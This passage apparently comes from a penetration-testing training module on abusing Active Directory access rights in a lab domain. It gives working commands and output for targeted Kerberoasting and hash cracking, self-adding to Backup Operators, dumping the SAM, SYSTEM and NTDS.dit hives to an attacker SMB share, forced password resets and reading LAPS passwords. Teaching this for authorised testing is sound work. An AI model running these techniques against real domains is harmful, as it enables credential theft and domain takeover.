We provided some examples to perform the enumeration or auditing of these access rights from Linux with [dacledit.py](https://raw.githubusercontent.com/ShutdownRepo/impacket/dacledit/examples/dacledit.py) and Windows with [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1). However, always remember that understanding how to use `BloodHound` to identify these access rights/privileges is crucial because the number of access rights to audit manually would be too large.

In the next section, we will learn about `targeted Kerberoasting` and how to carry out the attack from Linux and Windows.


# Targeted Kerberoasting

[Kerberoasting](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/detecting-ldap-based-kerberoasting-with-azure-atp/ba-p/462448) is a post-exploitation attack that takes advantage of the way `Service Principal Names` ( `SPNs`) are used in Active Directory for authentication. When a client requests a Kerberos TGS service ticket, it gets encrypted with the service account’s NTLM password hash. An attacker can obtain this ticket and perform offline password cracking to open it. If successful, the attacker can obtain the service account’s password. The success of this attack depends on the strength of the service account’s password. (Review the [Kerberos Attacks](https://academy.hackthebox.com/module/details/25) module to learn about `Kerberoasting` and other `Kerberos` attacks.)

When an attacker possesses an account with the ability to edit the `servicePrincipalName` attribute of another user account in a domain, they can potentially make that account vulnerable to a `Kerberoasting` attack. By adding an `SPN` to the user account, the attacker can request a Kerberos TGS service ticket for that `SPN` and obtain it, encrypted with the user account's NTLM password hash. The attacker can then use offline password-cracking techniques to try to open the ticket and obtain the user account's password.

This is possible when the controlled account has `GenericAll`, `GenericWrite`, `WriteProperty`, `WriteSPN` or `Validated-SPN` over the target.

## Identifying Vulnerable Accounts

We can use `BloodHound` to identify if we have these privileges:

![targeted_kerberoast_bloodhound.png](bHLwdc7LxD2B.png)

Alternatively, if we are working from Linux, we can also use [dacledit.py](https://raw.githubusercontent.com/ShutdownRepo/impacket/dacledit/examples/dacledit.py) to search for those rights. In the following example, we will query what rights the user `Pedro` has over the target account `Rita`:

#### Identifying Principals with Control over Another Account

```shell
python3 examples/dacledit.py -principal pedro -target Rita -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01

```

As we can see in the command's output, `Pedro` has `WriteProperty` or `Validated-SPN` over the target account `Rita`.

If we are working from Windows, we can use [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) to identify such privileges. First, we will need to get the `SID` for the user `Pedro` and then use it to filter the result of `Get-DomainObjectACL` for the user `Rita`:

#### Using PowerView to Identify Pedro's Rights over Rita

```powershell
PS C:\Tools> Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> $userSID = (Get-DomainUser -Identity pedro).objectsid

## Targeted Kerberoasting from Linux

From UNIX-like systems, [targetedKerberoast.py](https://github.com/ShutdownRepo/targetedKerberoast) can perform `targeted kerberasting`. `targetedKerberoast.py` is a Python script that can, like many other scripts (e.g., `GetUserSPNs.py`), print `kerberoast` hashes for user accounts with a set `SPN`. However, this tool brings the following additional feature: for each user without an `SPN`, it tries to set one (abusing the write access right on the `servicePrincipalName` attribute), print the `Kerberoastable` hash, and then delete the temporary SPN set for that user. Let us install the tool along with its dependencies:

  --aes-key hex key     AES key to use for Kerberos Authentication (128 or 256 bits)

```

Now we can use the `Pedro` account to attack the `Rita` account and try to retrieve its hash (we can also use the option `-o filename.txt` to save the hash into a file):

#### Targeted Kerberoasting from Linux

```shell
python3 targetedKerberoast.py -vv -d inlanefreight.local -u pedro -p SecuringAD01 --request-user rita --dc-ip 10.129.205.81

[*] Starting kerberoast attacks

[VERBOSE] SPN removed successfully for (Rita)

```

Note: If we get the error "Kerberos SessionError: KRB\_AP\_ERR\_SKEW(Clock skew too great)" while running targetedKerberoast.py or any other tool from Linux that use Kerberos as an authentication protocol, we need to sync the Linux machine's clock with the Active Directory DC's clock, using the ntpdate command, for example, sudo ntpdate DC\_IP\_ADDRESS.

## Targeted Kerberoasting from Windows

From Windows systems, we can utilize `Set-DomainObject` and `Get-DomainSPNTicket` from [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/)'s [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) to carry out a `targeted Kerberoasting` attack:

#### Targeted Kerberoasting from Windows

```powershell
PS C:\Tools> Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainUser Rita | Select serviceprincipalname

serviceprincipalname
--------------------

```

#### Setting the SPN

```powershell
PS C:\Tools> Set-DomainObject -Identity rita -Set @{serviceprincipalname='nonexistent/BLAHBLAH'} -Verbose

VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=rita)(name=rita)(displayname=rita))))
VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'nonexistent/BLAHBLAH' for object 'Rita'

```

#### Getting the Rita's Hash

```powershell
PS C:\Tools> $User = Get-DomainUser Rita
PS C:\Tools> $User | Get-DomainSPNTicket | Select-Object -ExpandProperty Hash

$krb5tgs$23$*Rita$INLANEFREIGHT.LOCAL$nonexistent/BLAHBLAH*$D4A950150D67A999192B12391DF13964$51114AA3599DA07F692CEB45<SNIP>

```

#### Clearing the SPNs of Rita

```powershell
PS C:\Tools> Set-DomainObject -Identity Rita -Clear serviceprincipalname -Verbose

VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=Rita)(name=Rita)(displayname=Rita))))
VERBOSE: [Set-DomainObject] Clearing 'serviceprincipalname' for object 'Rita'

```

Once we obtain the hash, we can use `hashcat` to crack it, utilizing hash-mode `13100` ( `Kerberos 5, etype 23, TGS-REP`):

#### Cracking the Kerberoastable Hash

```shell
hashcat -m 13100 /tmp/rita.hash /usr/share/wordlists/rockyou.txt --force

```

## Conclusion

As penetration testers and security experts, we must understand how to use different tools to achieve the same purpose when abusing `DACLs`. It is also essential to understand how these tools usually present information differently.

The following section will show how to abuse other `BloodHound` edges.

Note: BloodHound and all tools needed to complete the labs are located under C:\\Tools\\. BloodHound credentials are neo4j:Password123


# AddMembers

When an attacker controls a privileged user account with the ability to edit a group's member attribute, they can effectively add new users to that group. This attack/abuse is possible when the controlled account has `GenericAll`, `GenericWrite`, `Self`, `AllExtendedRights`, or `Self-Membership` over the target group.

## Identifying Vulnerable Groups

We can use `BloodHound` to determine if we have those privileges via the [AddMembers](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#addmembers) edge:

![addmember_bloodhound.png](gW2l8V0fooYf.png)

Alternatively, if we are working from Linux, we can also use [dacledit.py](https://raw.githubusercontent.com/ShutdownRepo/impacket/dacledit/examples/dacledit.py). In the following example, we will query which access rights the user `Pedro` has over the target group `Backup Operators`:

#### Identifying Pedro's Rights over the Backup Operators with dacledit.py

```shell
cd /home/plaintext/htb/modules/dacl/shutdownRepo/impacket
source .dacledit/bin/activate
python3 examples/dacledit.py -principal pedro -target 'Backup Operators' -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01

```

As we can see in the above output, `Pedro`, has `Self-Membership` over the target group `Backup Operators`; this means that `Pedro` can add himself to the group, but `Pedro` cannot add any other user.

If we are working from Windows, we can use [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) to identify such access rights. We will need to get the `Security Identifier` ( `SID`) for the user `Pedro` and then filter the result of `Get-DomainObjectACL` for the group `Backup Operators`:

## Abusing AddMember from Linux

To abuse `AddMember` privileges from Linux systems, we can use the [net](https://linux.die.net/man/8/net) tool, a built-in utility that allows administrators to manage samba and CIFS/SMB clients. However, it does not work with the `Self-Membership` access right because `net` uses the SMB protocol and remote calls to the `RPC protocol` to perform group modification. We can use [net](https://linux.die.net/man/8/net) if we have other rights except `Self-Membership`.

Let us try to use `net` on an account that does not have administrator privileges to query the `Backup Operators` group membership:

#### Using net to Query Group Membership

```shell
net rpc group members 'Backup Operators' -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.205.81

INLANEFREIGHT\carll

```

The results show that only `Carll` is a `Backup Operators` member. Now let us try to add `Pedro` to the group using `net`:

#### Using net to Add Pedro to Backup Operators

```shell
net rpc group addmem 'Backup Operators' pedro -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.205.81

Could not add pedro to Backup Operators: NT_STATUS_ACCESS_DENIED

```

We got access denied because `net` doesn't allow us to abuse group membership with `Self-Membership` rights. For such cases, an alternative is to use the LDAP protocol when we are trying to change a group's membership. Let us create a Python script to modify the group membership using LDAP. For this example, we will use the [addusertogroup](https://github.com/juliourena/ActiveDirectoryScripts/blob/main/Python/addusertogroup.py) Python script that utilizes the [ldap3 library](https://ldap3.readthedocs.io/en/latest/):

```python
# Import necessary modules
import argparse
import sys
from ldap3 import Server, Connection, ALL, NTLM, MODIFY_ADD, MODIFY_REPLACE, MODIFY_DELETE

# Parse command-line arguments
parser = argparse.ArgumentParser(description='Add a user to an Active Directory group.')
parser.add_argument('-d','--domain', required=True, help='The domain name of the Active Directory server.')
parser.add_argument('-g','--group', required=True, help='The name of the group to add the user to.')
parser.add_argument('-a','--adduser', required=True, help='The username of the user to add.')
parser.add_argument('-u','--user', required=True, help='The username of an Active Directory user with AddMember privilege.')
parser.add_argument('-p','--password', required=True, help='The password of the Active Directory user.')
args = parser.parse_args()

# Extract values from command-line arguments
domain_name = args.domain
group_name = args.group
user_name = args.adduser
ad_username = args.user
ad_password = args.password

# Construct the search base from the domain name
search_base = 'dc=' + ',dc='.join(domain_name.split('.'))

# Create a connection to the Active Directory server
server = Server(domain_name, get_info=ALL)
conn = Connection(
    server,
    user=f'{domain_name}\\{ad_username}',
    password=ad_password,
    authentication=NTLM
)

# Bind to the server with the given credentials
if conn.bind():
    print('[+] Connected to Active Directory successfully.')
else:
    print('[-] Error: failed to bind to the Active Directory server.')
    sys.exit(1)

# Search for the group with the given name
conn.search(
    search_base=search_base,
    search_filter=f'(&(objectClass=group)(cn={group_name}))',
    attributes=['member']
)

# Check if the group was found
if conn.entries:
    print('[+] Group ' + group_name + ' found.')
else:
    print('[-] Error: group not found.')
    sys.exit(1)

# Extract the group's DN and member list
group_dn = conn.entries[0].entry_dn
members = conn.entries[0].member.values

# Search for the user with the given username
conn.search(
    search_base=search_base,
    search_filter=f'(&(objectClass=user)(sAMAccountName={user_name}))',
    attributes=['distinguishedName']
)

# Check if the user was found
if conn.entries:
    print('[+] User ' + user_name + ' found.')
else:
    print('[-] Error: user not found.')
    sys.exit(1)

# Extract the user's DN
user_dn = conn.entries[0].distinguishedName.value

# Check if the user is already a member of the group
if user_dn in members:
    print('[+] User is already a member of the group.')
else:
    # Add the user to the group
    if conn.modify(
        dn=group_dn,
        changes={'member': [(MODIFY_ADD, [user_dn])]}
    ):
        print('[+] User added to group successfully.')
    else:
        print('[-] There was an error trying to add the user to the group.')

```

Using the LDAP protocol, this script adds a user to an Active Directory group in a Windows domain. We need to provide the following arguments when running it:

- `-d` or `--domain`: The Windows domain name to connect to.
- `-g` or `--group`: The group's name to add the user to.
- `-a` or `--adduser`: The user's username to add to the group.
- `-u` or `--user`: The username of an Active Directory user with `AddMember` privilege. The script uses this account to authenticate to the Active Directory server and perform the group membership modification.
- `-p` or `--password`: The password of the Active Directory user.

Once we provide these arguments, the script will connect to the Active Directory server using the provided credentials, search for the specified group and user, and then attempt to add the user to the group if they are not already a member of it. If the operation is successful, the script will print a success message; otherwise, it will print an error message.

#### Using LDAP for Adding a User to a Group

```shell
python3 addusertogroup.py -d inlanefreight.local -g "Backup Operators" -a pedro -u pedro -p SecuringAD01

[+] Connected to Active Directory successfully.
[+] Group Backup Operators found.
[+] User pedro found.
[+] User added to group successfully.

```

Note: The script uses DNS name resolution to connect to the domain. Make sure to configure the DNS and IP in the /etc/hosts file.

If we now query the group's membership, we will attain the following results:

#### Query Group Membership

```shell
net rpc group members 'Backup Operators' -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.205.81

INLANEFREIGHT\pedro
INLANEFREIGHT\carll

```

## Abusing AddMember from Windows

Similar to Linux, Windows also has its [net](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/net-commands-on-operating-systems) application, which also allows us to query, modify, create groups, users and other operations. `net` in Windows has the same limitation in Linux: we cannot use it to abuse the `Self-MemberShip` access right. That is why we need to use another method to be able to abuse the `AddMember` privilege. We will use the Cmdlet [Add-DomainGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/) from [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) to add a user to the group.

The way that `Add-DomainGroupMember` works is by using the `.NET` namespace [System.DirectoryServices.AccountManagement](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.accountmanagement?view=dotnet-plat-ext-7.0), which provide us with uniform access and manipulation of user, computer, and group security principals across the multiple principal stores: `Active Directory Domain Services` ( `AD DS`), `Active Directory Lightweight Directory Services` ( `AD LDS`), and `Machine SAM` ( `MSAM`).

Let us try to use `net` to query the `Backup Operators` group membership:

#### Query the Backup Operators Group Membership

```cmd-session
C:\Tools> net localgroup "Backup Operators"

Alias name     Backup Operators
Comment        Backup Operators can override security restrictions for the sole purpose of backing up or restoring files

Members

-------------------------------------------------------------------------------
carll
The command completed successfully

```

Note: Instead of net group we used net localgroup as "Backup Operators" is a built-in group in Active Directory, and we are querying it from the DC. If we perform the same action from a Domain-joined machine, we should instead use net group "Backup Operators" /domain

We will get the "Access Denied" error message if we try to add `Pedro` to the group using `net`:

#### Trying to add Pedro to the Backup Operators Group with net

```cmd-session
C:\Tools> net localgroup "Backup Operators" pedro /add

System error 5 has occurred.

Access is denied.

```

We cannot modify the group membership when we have `Self-MemberShip`. For this reason, we will use `PowerView` to abuse the `AddMember` privilege.

#### Adding a User to a Group using PowerView

```powershell
PS C:\Tools> Add-DomainGroupMember -Identity "Backup Operators" -Members pedro -Verbose

VERBOSE: [Add-DomainGroupMember] Adding member 'pedro' to group 'Backup Operators'

```

## Abusing the Newly Gained Privileges from Windows

We added `Pedro` to the `Backup Operators` group. Nevertheless, if we already have logged in as `Pedro` to abuse the `Backup Operators` group privileges, we must reauthenticate to the Domain to get a ticket with the required group membership. We will also need to make sure to launch a new `powershell.exe` or `cmd.exe` as Administrator, because regardless that we are not administrators, the `Backup Operators` group gives us access to the privilege `SeBackupPrivilege`, which needs to comply with the `User Account Control` ( `UAC`) settings.

Let us launch a new `cmd.exe` window as Administrator and use the credentials of `Pedro` to confirm we have the appropriate access rights/privileges:

#### Pedro with Backup Operators Privileges

```cmd-session
C:\Tools> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

```

Subsequently, we can use abuse `SeBackupPrivilege` by copying the `SAM` & `SYSTEM` registry hives to extract local accounts credentials:

#### Backing up the SAM and SYSTEM Hives

```cmd-session
C:\Tools> reg save hklm\sam C:\users\Public\sam && reg save hklm\system C:\users\Public\system

The operation completed successfully.
The operation completed successfully.

```

Because we are working with Active Directory, we also need its database, [NTDS.dit](https://windowstechno.com/what-is-ntds-dit/). To get it, we need to create a [Shadow Copy](https://learn.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) because the operating system uses the Active Directory database. The shadow copy will create a copy of the selected disk, and we will take the database from that copy.

[Diskshadow.exe](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) is a tool that exposes the functionality of the `Volume Shadow Copy Service` ( `VSS`). We will use a [diskshadow](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) script to create the shadow copy:

#### Create a File with the Commands Required to Execute diskshadow

```cmd-session
C:\Tools> more C:\Users\Public\diskshadowscript.txt

set context persistent nowriters
set metadata c:\windows\temp\file.cab
set verbose on
begin backup
add volume c: alias mydrive

create

expose %mydrive% p:
end backup

```

The script performs a backup, creates a persistent shadow copy of the `C:` volume (the system drive) on Windows, and assigns it a drive letter `p`, which can be accessed for backup or recovery purposes. Here is a breakdown of the commands:

- `set context persistent nowriters`: This sets the context for the shadow copy to be persistent (so it can be accessed after the backup) and specifies that no writers should be used. This is useful for creating a live system backup without interfering with running applications or services.
- `set metadata c:\windows\temp\file.cab`: Sets the location for the metadata of the shadow copy to be saved. This includes all information associated with the shadow copy that describes its state and contents.
- `set verbose on`: This enables verbose output for debugging purposes.
- `begin backup`: This starts the backup process.
- `add volume c: alias mydrive`: This adds the `C:` volume to the backup and assigns it an alias named "mydrive".
- `create`: This creates a shadow copy of the selected volume.
- `expose %mydrive% p:`: This assigns the shadow copy to the drive letter `P:`. The original drive letter of the selected volume may differ from `C:` therefore, this command ensures that the backup is accessible as a drive letter.
- `end backup`: This ends the backup process.

#### Execute diskshadow

```cmd-session

```

Next, we can use [robocopy](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy) to copy from the shadow copy:

#### Using robocopy to Copy from Shadow Copy

## Abusing the Newly Gained Privileges from Linux

In Linux, we would not have to worry about authentication since every interaction of our tools is a new connection. However, suppose we use `ccache` or similar forms of Kerberos authentication with files. In that case, we must re-authenticate and generate new files to apply those new privileges to our new session. For more information, refer to the `Pass the Ticket (PtT) from Linux` section of the `Password Attacks` module.

To save the registry hive from a Linux machine, we will create an SMB share folder and save the files there.

#### Starting the SMB Server

```shell
sudo smbserver.py -smb2support share .

Now, we can use [reg.py](https://github.com/fortra/impacket/blob/master/examples/reg.py) from [Impacket](https://github.com/fortra/impacket/) to retrieve the registry hives from Linux using the credentials of `Pedro`:

#### Retrieving the SAM & SYSTEM Registry Hives with reg.py

```shell

[-] Saved HKLM\SYSTEM to \\10.10.14.33\share\SYSTEM.save
<SNIP>

```

Depending on our privileges, we may be unable to retrieve the `NTDS.dit` database from Linux. `Pedro` is not privileged to connect via SMB to the target machine; therefore, we cannot retrieve the `ntds.dit` remotely. Instead, we must connect via RDP and download `ntds.dit` to complete this attack.

Once we have the `SAM` and the `SYSTEM` registry hives and the `ntds.dit` database, we can use [secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) to dump the database and attain the Administrator's hash:

# Password Abuse

The abuse of passwords is one of the most common attack vectors to gain access to systems and data. `DACLs` can be exploited to abuse password security, especially when we gain access to privileged accounts. This section will explore how different types of `DACL` (mis)configurations can enable password abuse attacks and their implications for system security.

Specifically, we will delve into the abuse of `DACL` privileges such as [ForceChangePassword](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#forcechangepassword), [ReadLAPSPassword](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#readlapspassword), and [ReadGMSAPassword](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#readgmsapassword). By abusing these privileges, we can reset passwords for other accounts or read passwords for local and domain accounts.

## ForceChangePassword

[User-Force-Change-Password](https://learn.microsoft.com/en-us/windows/win32/adschema/r-user-force-change-password) is an extended access right that allows users to reset the passwords of other accounts, even those with higher privileges. Let us explore the implications of the [ForceChangePassword](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#forcechangepassword) edge and how we can abuse it.

If we control an account that can modify another user's password, we can effectively take over that user's account by changing the password; this is only possible if the controlled account has certain access rights, such as `GenericAll`, `AllExtendedRights`, or `User-Force-Change-Password`, over the target account. These access rights allow the controlled account to modify the target account's password without requiring additional authentication or authorization.

## Identifying Vulnerable Accounts

We can use `BloodHound` to identify if we have those access rights. Using a Cypher query, let us search for `Pedro`, and whether he has `ForceChangePassword`, `GenericAll` or `AllExtendedRights` over any account:

```cypher
MATCH p=((n:User {name:"[email protected]"})-[r:ForceChangePassword|GenericAll|AllExtendedRights]->(m)) RETURN p

```

![pedro_passwordAttacks.jpg](QC45SOq0JMI1.jpg)

Alternatively, if we are attacking from Linux, we can also use [dacledit.py](https://raw.githubusercontent.com/ShutdownRepo/impacket/dacledit/examples/dacledit.py) to search for those `access rights`. Let us enumerate the access rights that `Pedro` has over the accounts `htb-test`, `yolanda`, and `joshua`, respectively:

```

As we can see in the above output, the trustee `Pedro` has different access rights that allow him to perform a password reset against these accounts.

If we want to perform the same enumeration from Windows, we can use [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1). When we include the option `-ResolveGUIDs`, `PowerView` will resolve `GUIDs` to their display names. In the following example, if we do not use `-ResolveGUIDs` for the `yolanda` account, we will get the following:

#### Identifying Pedro's Access Rights over Yolanda

```powershell
PS C:\Tools> Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> $userSID = (Get-DomainUser -Identity pedro).objectsid
PS C:\Tools> Get-DomainObjectAcl -Identity yolanda | ?{$_.SecurityIdentifier -eq $userSID}

ObjectDN               : CN=Yolanda,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
ObjectSID              : S-1-5-21-1267651629-1192007096-1618970724-4616
ActiveDirectoryRights  : ExtendedRight
ObjectAceFlags         : ObjectAceTypePresent
ObjectAceType          : 00299570-246d-11d0-a768-00aa006e0529
InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
BinaryLength           : 56
AceQualifier           : AccessAllowed
IsCallback             : False
OpaqueLength           : 0
AccessMask             : 256
SecurityIdentifier     : S-1-5-21-1267651629-1192007096-1618970724-4617

IsInherited            : False
InheritanceFlags       : None
PropagationFlags       : None
AuditFlags             : None

```

The `ObjectAceType` value is `00299570-246d-11d0-a768-00aa006e0529`, and in the second section of the module, we mentioned that this value corresponds to the `extended access right` `User-Force-Change-Password`; if we want to get the name instead of the `GUID` we need to use the `-ResolveGUIDs` option:

```powershell
PS C:\Tools> Get-DomainObjectAcl -Identity yolanda -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $userSID}

AceQualifier           : AccessAllowed
ObjectDN               : CN=Yolanda,CN=Users,DC=INLANEFREIGHT,DC=LOCAL

```

## Abusing PasswordReset from Linux

To perform a password reset from Linux, we can use [net](https://linux.die.net/man/8/net). This operation does not require admin rights, meaning we can use it; unlike in Windows, using `net user` to perform a password reset requires Administrative privileges. Additionally, [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit) can be used to run net commands with `pass-the-hash`:

#### Validating the Credentials

```shell
poetry run crackmapexec ldap 10.129.205.81 -u yolanda -p Mynewpassword1

SMB         10.129.205.81   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
LDAP        10.129.205.81   445    DC01             [-] INLANEFREIGHT.LOCAL\yolanda:Mynewpassword1

```

#### Password Reset with net

```shell
net rpc password yolanda Mynewpassword1 -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.205.81

```

#### Validating the Credentials

```shell
poetry run crackmapexec ldap 10.129.205.81 -u yolanda -p Mynewpassword1
SMB         10.129.205.81   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
LDAP        10.129.205.81   389    DC01             [+] INLANEFREIGHT.LOCAL\yolanda:Mynewpassword1

```

Also, we can use `rpcclient` to perform a password reset from Linux as follows:

#### Password Reset with rpcclient

```shell
rpcclient -U INLANEFREIGHT/pedro%SecuringAD01 10.129.205.81

rpcclient $> setuserinfo2 yolanda 23 Mynewpassword2
rpcclient $> exit

```

#### Validating the Credentials

```shell
poetry run crackmapexec ldap 10.129.205.81 -u yolanda -p Mynewpassword2

SMB         10.129.205.81   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
LDAP        10.129.205.81   389    DC01             [+] INLANEFREIGHT.LOCAL\yolanda:Mynewpassword2

```

## Abusing PasswordReset from Windows

From Windows systems, we will use the [Set-DomainUserPassword](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainUserPassword/) function from [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1). It will allow us to set the password for our target account:

#### Password Reset with Set-DomainUserPassword

```powershell
PS C:\Tools> Set-DomainUserPassword -Identity yolanda -AccountPassword $((ConvertTo-SecureString 'NewpasswordfromW1' -AsPlainText -Force)) -Verbose

VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'yolanda'
VERBOSE: [Set-DomainUserPassword] Password for user 'yolanda' successfully reset

```

#### Password Reset with Active Directory Module

```powershell
PS C:\Tools> Import-Module ActiveDirectory
PS C:\Tools> Set-ADAccountPassword yolanda -NewPassword $((ConvertTo-SecureString 'NewpasswordfromW2' -AsPlainText -Force)) -Reset -Verbose

VERBOSE: Performing the operation "Set-ADAccountPassword" on target "CN=Yolanda,CN=Users,DC=INLANEFREIGHT,DC=LOCAL".

```

## ReadLAPSPassword

Microsoft's [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) allows companies to manage their local admin passwords better: instead of having a shared password between local admins (which happens all the time), `LAPS` offers a simple method to make local admins with random and cryptographically strong passwords that rotate every 30 days (by default).

`LAPS` allows managing the local Administrator password (randomized, unique, and changed regularly) on domain-joined computers. These passwords are centrally stored in Active Directory and restricted to authorized users using `ACLs`. Passwords are protected in transit from the client to the server using Kerberos v5 and AES. Here is how it works:

- A `LAPS` client is installed on each computer. This client is responsible for periodically changing the local administrator password on the computer.
- The password is stored in Active Directory as an attribute of the computer object. This attribute is named `ms-MCS-AdmPwd`.
- To access the local administrator password for a computer, we can use the `LAPS` UI tool or PowerShell to retrieve the current password from Active Directory.
- The password is only visible to users granted permission to read it.

## Identifying LAPS Privileges

If we get access to an account that has privileges to read `LAPS` password attributes or with either `GenericAll` or `AllExtendedRights` access rights against a target computer configured with `LAPS`, we can retrieve the local administrator password from Active Directory by reading the `ms-MCS-AdmPwd` attribute.

`BloodHound` has an edge named [ReadLAPSPassword](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#readlapspassword), which searches if an account has the `ReadProperty` access right over the attribute `ms-MCS-AdmPwd` and if `ms-MCS-AdmPwdExpirationTime` is set. This edge helps us to identify potential attack paths by revealing accounts that can read the `LAPS` password attribute. We can use the following cypher query to identify accounts with the `ReadLAPSPassword` access right:

```cypher
MATCH p=((n)-[r:ReadLAPSPassword]->(m)) RETURN p

```

![read_laps_passwords.jpg](krtkXdBbUc79.jpg)

As we can see, `Pedro` and the group `LAPS READERS` have `ReadLAPSPassword` over the computer `LAPS09`. `Rita` is a member of the `LAPS READERS` group; we can use the `BloodHound` pathfinder tool to search for this path:

![rita_laps_bloodhound.jpg](LPUcsEKs1Ed1.jpg)

Lets see what happens if we try to use `dacledit.py` to identify whether the principal `Rita` has any `DACL` over the `LAPS09` computer account:

#### Searching DACLs for Rita

```shell
python3 examples/dacledit.py -principal rita -target 'laps09$' -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01

```

`dacledit.py` reports there aren't any. This is one of the limitations that [dacledit.py](https://raw.githubusercontent.com/ShutdownRepo/impacket/dacledit/examples/dacledit.py) has, as it does not correlate groups and their members; although `Rita` has privileges to read `LAPS` from `LAPS09`, `dacledit.py` cannot detect it because the privilege is assigned to the group.

If we use the principal as `LAPS Readers` and the target `LAPS09`, we get a match that we have `ReadProperty`, which is required to read `LAPS`:

#### Searching DACL LAPS Readers Group

```

If we want to search for those access rights using `PowerView`, we can use [Get-DomainObjectAcl](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainObjectAcl/):

#### Using PowerView to Enumerate DACLs

```powershell
PS C:\Tools> $group = Get-DomainGroup -Identity "LAPS Readers"

```

Note: Please be aware that, similar to dacledit.py, PowerView also shares the same limitation: it does not conduct a recursive membership search to correlate users with the privileges associated with the groups they belong. Considering this aspect while utilizing these tools for user and group analysis is essential.

## Abusing ReadProperty from Windows

From Windows systems, the modules `ActiveDirectory` or `PowerView` can be used to dump the `LAPS` password:

#### Using PowerView to Dump the LAPS Password

```powershell
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainObject -Identity LAPS09 -Properties "ms-mcs-AdmPwd",name

name   ms-mcs-admpwd
----   -------------
LAPS09 Nzr$jIzT/JV4@!

```

#### Using ActiveDirectory to Dump the LAPS Password

```powershell
PS C:\Tools> Import-Module ActiveDirectory
PS C:\Tools> Get-ADComputer -Identity LAPS09 -Properties "ms-mcs-AdmPwd",name

DistinguishedName : CN=LAPS09,OU=LAPS_PC,DC=INLANEFREIGHT,DC=LOCAL
DNSHostName       : LAPS09.INLANEFREIGHT.LOCAL
Enabled           : True
ms-mcs-AdmPwd     : Nzr$jIzT/JV4@!
Name              : LAPS09
ObjectClass       : computer
ObjectGUID        : e348774a-9090-4d20-97fd-d340e218252f
SamAccountName    : LAPS09$
SID               : S-1-5-21-1267651629-1192007096-1618970724-4648
UserPrincipalName :

```

If we want to enumerate all computers with `LAPS` enabled, we can use the following script:

#### Collect all LAPS-enabled Computers with PowerView

```powershell
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainComputer -Properties name | ForEach-Object {
    $computer = $_.name
    $obj = Get-DomainObject -Identity $computer -Properties "ms-mcs-AdmPwd",name -ErrorAction SilentlyContinue
    if($obj.'ms-mcs-AdmPwd'){
        Write-Output "$computer`: $($obj.'ms-mcs-AdmPwd')"
    }
}

DC01:
LAPS01: s19I/p9J5@[F$s
